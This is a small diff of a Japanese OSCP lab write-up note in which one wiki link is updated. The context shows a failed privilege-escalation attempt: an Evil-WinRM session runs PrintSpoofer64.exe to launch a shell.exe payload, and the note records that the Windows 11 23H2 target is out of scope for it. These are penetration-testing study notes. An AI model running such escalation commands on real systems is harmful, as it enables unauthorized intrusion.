@@ -26,7 +26,7 @@ Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 
 - 実行
 	- 失敗
-	- [[r.andrews#システム情報]]より、OSがWindows 11 version 23H2であるため、対象外
+	- [[OSCP/Lab_Writeup/OSCP/Old_Exam/AD1/WS26/Enumeration/Internal/r.andrews#システム情報]]より、OSがWindows 11 version 23H2であるため、対象外
 ```powershell
 *Evil-WinRM* PS C:\Users\r.andrews> .\PrintSpoofer64.exe -i　-c ".\shell.exe" 
 [+] Found privilege: SeImpersonatePrivilege
